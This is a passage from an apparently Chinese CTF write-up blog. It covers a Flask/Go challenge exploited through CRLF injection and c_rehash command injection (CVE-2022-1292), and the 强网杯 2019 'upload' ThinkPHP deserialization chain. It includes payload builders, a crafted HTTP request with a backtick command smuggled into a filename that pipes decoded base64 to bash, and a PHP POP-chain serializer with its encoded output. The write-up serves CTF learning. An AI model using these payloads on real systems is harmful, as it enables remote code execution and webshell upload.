request.form.get(<span class="hljs-string">&quot;City&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-title class_">OrganizationalName</span> = request.form.get(<span class="hljs-string">&quot;OrganizationalName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-title class_">CommonName</span> = request.form.get(<span class="hljs-string">&quot;CommonName&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-title class_">EmailAddress</span> = request.form.get(<span class="hljs-string">&quot;EmailAddress&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-keyword">return</span> get_crt(<span class="hljs-title class_">Country</span>, <span class="hljs-title class_">Province</span>, <span class="hljs-title class_">City</span>, <span class="hljs-title class_">OrganizationalName</span>, <span class="hljs-title class_">CommonName</span>, <span class="hljs-title class_">EmailAddress</span>)<br> <br> <br><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/createlink&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>():<br>    json_data = &#123;<span class="hljs-string">&quot;info&quot;</span>: os.popen(<span class="hljs-string">&quot;c_rehash static/crt/ &amp;&amp; ls static/crt/&quot;</span>).read()&#125;<br>    <span class="hljs-keyword">return</span> json.dumps(json_data)<br> <br> <br><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy</span>():<br>    uri = request.form.get(<span class="hljs-string">&quot;uri&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    client = socket.socket()<br>    client.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8887</span>))<br>    msg = f<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;GET &#123;uri&#125; HTTP/1.1</span><br><span class="hljs-string">Host: test_api_host</span><br><span class="hljs-string">User-Agent: Guest</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br>    client.send(msg.encode())<br>    data = client.recv(<span class="hljs-number">2048</span>)<br>    client.close()<br>    <span class="hljs-keyword">return</span> data.decode()<br> <br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure><p>Getcrt函数源码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs css">def get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress):<br>    root_key = rsa.<span class="hljs-built_in">generate_private_key</span>(<br>        public_exponent=<span class="hljs-number">65537</span>,<br>        key_size=<span class="hljs-number">2048</span>,<br>        backend=<span class="hljs-built_in">default_backend</span>()<br>    )<br>    subject = issuer = x509.<span class="hljs-built_in">Name</span>([<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.COUNTRY_NAME, Country),<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.STATE_OR_PROVINCE_NAME, Province),<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.LOCALITY_NAME, City),<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.ORGANIZATION_NAME, OrganizationalName),<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.COMMON_NAME, CommonName),<br>        x509.<span class="hljs-built_in">NameAttribute</span>(NameOID.EMAIL_ADDRESS, EmailAddress),<br>    ])<br>    root_cert = x509.<span class="hljs-built_in">CertificateBuilder</span>().<span class="hljs-built_in">subject_name</span>(<br>        subject<br>    ).<span class="hljs-built_in">issuer_name</span>(<br>        issuer<br>    ).<span class="hljs-built_in">public_key</span>(<br>        root_key.<span class="hljs-built_in">public_key</span>()<br>    ).<span class="hljs-built_in">serial_number</span>(<br>        x509.<span class="hljs-built_in">random_serial_number</span>()<br>    ).<span class="hljs-built_in">not_valid_before</span>(<br>        datetime.datetime.<span class="hljs-built_in">utcnow</span>()<br>    ).<span class="hljs-built_in">not_valid_after</span>(<br>        datetime.datetime.<span class="hljs-built_in">utcnow</span>() + datetime.<span class="hljs-built_in">timedelta</span>(days=<span class="hljs-number">3650</span>)<br>    ).<span class="hljs-built_in">sign</span>(root_key, hashes.<span class="hljs-built_in">SHA256</span>(), <span class="hljs-built_in">default_backend</span>())<br>    crt_name = <span class="hljs-string">&quot;static/crt/&quot;</span> + <span class="hljs-built_in">str</span>(uuid.<span class="hljs-built_in">uuid4</span>()) + <span class="hljs-string">&quot;.crt&quot;</span><br>    with <span class="hljs-built_in">open</span>(crt_name, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>        f.<span class="hljs-built_in">write</span>(root_cert.<span class="hljs-built_in">public_bytes</span>(serialization.Encoding.PEM))<br>    return crt_name<br></code></pre></td></tr></table></figure><p>Go Server源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">admin</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>staticPath := <span class="hljs-string">&quot;/app/static/crt/&quot;</span><br>oldname := c.DefaultQuery(<span class="hljs-string">&quot;oldname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>newname := c.DefaultQuery(<span class="hljs-string">&quot;newname&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> oldname == <span class="hljs-string">&quot;&quot;</span> || newname == <span class="hljs-string">&quot;&quot;</span> || strings.Contains(oldname, <span class="hljs-string">&quot;..&quot;</span>) || strings.Contains(newname, <span class="hljs-string">&quot;..&quot;</span>) &#123;<br>c.String(<span class="hljs-number">500</span>, <span class="hljs-string">&quot;error&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> c.Request.URL.RawPath != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br>err := os.Rename(staticPath+oldname, staticPath+newname)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, newname)<br><span class="hljs-keyword">return</span><br>&#125;<br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;no&quot;</span>)<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">index</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.String(<span class="hljs-number">200</span>, <span class="hljs-string">&quot;hello world&quot;</span>)<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>router := gin.Default()<br>router.GET(<span class="hljs-string">&quot;/&quot;</span>, index)<br>router.GET(<span class="hljs-string">&quot;/admin/rename&quot;</span>, admin)<br> <br><span class="hljs-keyword">if</span> err := router.Run(<span class="hljs-string">&quot;:8887&quot;</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过访问 <code>/getcrt</code> 路由会去调用<code>getcrt()</code>, 而<code>getcrt()</code> 会去生成一个<code>crt证书</code>,<code>createlink</code>路由调用<code>c_rehash</code>，而<code>c_rehash</code>存在命令执行漏洞，漏洞的成因大概为文件名可控，由于低版本openssl对于元字符的过滤不严谨，导致文件名中含有 “ <strong>&#96;</strong> “字符的话会导致文件名被当作命令执行。而访问路由proxy时候，用户可以自定义HTTP请求，从而导致CLRF结合CVE-2022-1292导致RCE。</p><p><strong>Go源码中出现了有过滤函数</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> c<span class="hljs-selector-class">.Request</span><span class="hljs-selector-class">.URL</span><span class="hljs-selector-class">.RawPath</span> != <span class="hljs-string">&quot;&quot;</span> &amp;&amp; c<span class="hljs-selector-class">.Request</span><span class="hljs-selector-class">.Host</span> == <span class="hljs-string">&quot;admin&quot;</span> &#123;<br></code></pre></td></tr></table></figure><p><strong>Bypass方法</strong></p><p>将请求的 <code>uri</code> 参数第二个反斜杠进行URL编码，第二个要求 Host: admin</p><p>然后需要将内容写入文件中，直接去访问&#x2F;static&#x2F;crt&#x2F;下的对应文件即可</p><p><strong>数据包构造</strong></p><p>uri内容编码 由于flask最后有段代码 <code>return data.decode()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>uri = <span class="hljs-string">&#x27;&#x27;&#x27;/admin%2frename?oldname=9c022d27-7635-4ca3-ac5e-1b3eb6e79d18.crt&amp;newname=`echo%20Y2F0IC8qIA==|base64%20--decode|bash&gt;flag.txt`.crt HTTP/1.1</span><br><span class="hljs-string">Host: admin</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>gopher = uri.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = urllib.parse.quote(gopher)<br><span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile">GET /proxy HTTP/1.1<br><span class="hljs-section">Host: 1.14.71.254:28192</span><br><span class="hljs-section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="hljs-section">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="hljs-section">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-section">Accept-Encoding: gzip, deflate</span><br><span class="hljs-section">Connection: close</span><br><span class="hljs-section">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-section">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-section">Content-Length: 206</span><br><br>uri=/admin%252frename%3Foldname%3D9c022d27-7635-4ca3-ac5e-1b3eb6e79d18.crt%26newname%3D%60echo%2520Y2F0IC8qIA%3D%3D%7Cbase64%2520--decode%7Cbash%3Eflag.txt%60.crt%20HTTP/1.1%0D%0AHost%3A%20admin%0D%0A<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411042215723.png" alt="img"></p><p>最后访问<code>createlink</code>触发代码</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411042215494.png" alt="img"></p><p><code>/static/crt/flag.txt</code>查看flag.txt</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411042215000.png" alt="img"></p><h1 id="强网杯-2019-upload"><a href="#强网杯-2019-upload" class="headerlink" title="[强网杯 2019]upload"></a>[强网杯 2019]upload</h1><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072141200.png" alt="image-20241107214136325"></p><p>登陆注册，有上传功能</p><p>上传一张图片，发现被改后缀为png，而且可以看到路径和文件名都进行了重命名使用md5值</p><p>bp抓包发现cookie参数user</p><p>反序列化得到</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072144509.png" alt="img"></p><p>目录扫描出一个<a href="http://www.tar.gz在网站根目录,打开发现是thinkphp5框架/">www.tar.gz在网站根目录，打开发现是ThinkPHP5框架</a></p><p>审计中找到了 <code>__destruct()</code>魔法函数</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072147089.png" alt="img"></p><p>同时，在Index.php中，找到了<a href="https://cloud.tencent.com/product/mfas?from_column=20065&from=20065">身份验证</a>的方法</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072148501.png" alt="img"></p><p><code>Index.php</code>会对传入的内容进行base64解码，然后反序列化</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072148893.png" alt="img"></p><p>发现了 <code>Profile.php</code>中，有对文件重命名的操作</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072148002.png" alt="img"></p><p>为了能正常的利用upload_img来进行copy操作，就得将if都过了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$this</span>-&gt;checker)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$this</span>-&gt;checker-&gt;login_check())&#123;<br>        <span class="hljs-variable">$curr_url</span>=<span class="hljs-string">&quot;http://&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="hljs-string">&quot;/index&quot;</span>;<br>        <span class="hljs-variable">$this</span>-&gt;redirect(<span class="hljs-variable">$curr_url</span>,<span class="hljs-number">302</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>确保里面的内容不会被执行， <code>checker</code>不赋值或者等于false就好了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>))&#123;<br>    <span class="hljs-variable">$this</span>-&gt;<span class="hljs-attribute">filename_tmp</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$this</span>-&gt;<span class="hljs-attribute">filename</span>=md5($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.png&quot;</span>;<br>    <span class="hljs-variable">$this</span>-&gt;ext_check();<br>&#125;<br></code></pre></td></tr></table></figure><p>两个文件名的参数都没有什么过滤，唯一的阻碍是 <code>ext_check()</code>，他会判断你的后缀是否为png，没啥用</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;ext) &#123;<br><span class="hljs-keyword">if</span>(getimagesize($<span class="hljs-keyword">this</span>-&gt;filename_tmp)) &#123;<br>    <span class="hljs-meta">@copy($this-&gt;filename_tmp, $this-&gt;filename)</span>;<br>    <span class="hljs-meta">@unlink($this-&gt;filename_tmp)</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;img=<span class="hljs-string">&quot;../upload/<span class="hljs-variable">$this</span>-&gt;upload_menu/<span class="hljs-variable">$this</span>-&gt;filename&quot;</span>;<br>    $<span class="hljs-keyword">this</span>-&gt;update_img();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $<span class="hljs-keyword">this</span>-&gt;error(<span class="hljs-string">&#x27;Forbidden type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    $<span class="hljs-keyword">this</span>-&gt;error(<span class="hljs-string">&#x27;Unknow file type!&#x27;</span>, url(<span class="hljs-string">&#x27;../index&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>ext的值，需要为 <code>True</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(getimagesize(<span class="hljs-variable">$this</span>-&gt;filename_tmp)</span></span>) &#123;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072152817.png" alt="image-20241107215232768"></p><p>如何触发反序列化，在当前文件 <code>Profile.php</code>中，我们发现了 <code>__get</code>和 <code>__call</code>这两个魔法函数</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072153768.png" alt="img"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">读取不可访问属性的值时，<span class="hljs-built_in">__get</span>() 会被调用； <br>在对象中调用一个不可访问方法时，<span class="hljs-built_in">__call</span>() 会被调用。<br></code></pre></td></tr></table></figure><p>回到Register.php中看 <code>__destruct()</code>的操作</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072155654.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411072153151.png" alt="img"></p><p>checker会去 <code>Index()</code>中调用 <code>index()</code>（注意区分大小写）</p><p>如果我们将 <code>$this-&gt;checker</code>覆盖为 <code>类Profile()</code>但是因为 <code>Profile()</code>中没有index()，所以会触发 <code>__call()</code>魔法函数</p><p>进入该类之后，会调用一个不存在的对象，导致 <code>__get()</code>的触发，所以我们需要在序列化的时候，将 <code>except</code>赋值为</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">public</span> <span class="hljs-keyword">except</span> = [<span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-string">&#x27;img&#x27;</span>];<br></code></pre></td></tr></table></figure><p>就可以触发 <code>upload_img</code>，达到改名的效果了</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">__destruct<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__call<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>__get<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>upload_img<br></code></pre></td></tr></table></figure><p>构造一个 Profile 和 Register 类，命名空间 app\web\controller（要不然反序列化会出错，不知道对象实例化的是哪个类）。然后给其 except 成员变量赋值 [‘index’ &#x3D;&gt; ‘img’]，代表要是访问 index 这个变量，就会返回 img。而后又给 img 赋值 upload_img，让这个对象被访问不存在的方法时最终调用 upload_img。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">web</span>\<span class="hljs-title class_">controller</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Profile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename_tmp</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$upload_menu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$img</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$except</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;except[<span class="hljs-variable">$name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$name</span>&#125;&#125;(<span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Register</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$checker</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$registed</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable language_">$this</span>-&gt;registed)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checker-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-variable">$profile</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Profile</span>();<br><span class="hljs-variable">$profile</span>-&gt;except = [<span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-variable">$profile</span>-&gt;img = <span class="hljs-string">&quot;upload_img&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;ext = <span class="hljs-string">&quot;png&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename_tmp = <span class="hljs-string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.png&quot;</span>;<br><span class="hljs-variable">$profile</span>-&gt;filename = <span class="hljs-string">&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/1905e3297318e07f689eeda3afb79dc7.php&quot;</span>;<br><br><span class="hljs-variable">$register</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Register</span>();<br><span class="hljs-variable">$register</span>-&gt;registed = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$register</span>-&gt;checker = <span class="hljs-variable">$profile</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$register</span>)));<br><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Tzoy<span class="hljs-symbol">NzoiYXBwXHdlYlxjb250</span>c<span class="hljs-name">m9</span>sbGVyXFJlZ<span class="hljs-number">2</span>lzdGVyIjoyO<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO086</span>MjY<span class="hljs-number">6</span>ImFwcFx<span class="hljs-number">3</span>ZWJcY<span class="hljs-number">29</span>udHJvbGxlclxQc<span class="hljs-name">m9</span>maWxlIj<span class="hljs-meta">o3</span>O<span class="hljs-symbol">ntzOjc6</span>Im<span class="hljs-symbol">NoZWNrZXIiO047</span>czoxMjoiZmlsZW<span class="hljs-number">5</span>hbWVfd<span class="hljs-name">G1</span>wIjtzOjc<span class="hljs-number">4</span>OiIuL<span class="hljs-number">3</span>Vwb<span class="hljs-name">G9</span>hZC<span class="hljs-number">83</span><span class="hljs-symbol">NmQ5</span>ZjAw<span class="hljs-symbol">NDY3</span>ZTVlZTZhYmMzY<span class="hljs-number">2</span>E<span class="hljs-number">2</span>MD<span class="hljs-name">g5</span>MmVmMzA<span class="hljs-number">0</span>ZS<span class="hljs-number">8</span>xOTA<span class="hljs-number">1</span>ZTMyOTczMThlMDdm<span class="hljs-symbol">Njg5</span>ZWVkYT<span class="hljs-symbol">NhZmI3</span>OWRj<span class="hljs-symbol">Ny5</span>wbmci<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>ODoiZmlsZW<span class="hljs-number">5</span>hbWUi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span><span class="hljs-symbol">Nzg6</span>Ii<span class="hljs-number">4</span>vdXBsb<span class="hljs-number">2</span>FkLzc<span class="hljs-number">2</span>ZDlmMDA<span class="hljs-number">0</span><span class="hljs-symbol">NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzE5</span>MDVlMzI<span class="hljs-number">5</span><span class="hljs-symbol">NzMxOGUwN2</span>Y<span class="hljs-number">2</span>ODllZWRh<span class="hljs-name">M2</span>FmYjc<span class="hljs-number">5</span>ZG<span class="hljs-name">M3</span>L<span class="hljs-symbol">nBocCI7</span>czoxMToidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">21</span>lb<span class="hljs-symbol">nUiO047</span>czozOiJleHQi<span class="hljs-meta">O3</span><span class="hljs-name">M6</span>Mzoic<span class="hljs-name">G5</span><span class="hljs-symbol">nIjtzOjM6</span>ImltZyI<span class="hljs-number">7</span>czoxMDoidXBsb<span class="hljs-number">2</span>FkX<span class="hljs-number">2</span>ltZyI<span class="hljs-number">7</span>cz<span class="hljs-meta">o2</span>OiJleG<span class="hljs-symbol">NlcHQiO2</span>E<span class="hljs-number">6</span>MTp<span class="hljs-number">7</span>cz<span class="hljs-meta">o1</span>OiJpbmRleCI<span class="hljs-number">7</span>czozOiJpbWci<span class="hljs-meta">O319</span>cz<span class="hljs-meta">o4</span>OiJyZWdpc<span class="hljs-number">3</span>RlZCI<span class="hljs-number">7</span>Yjow<span class="hljs-meta">O30</span><span class="hljs-meta">%</span><span 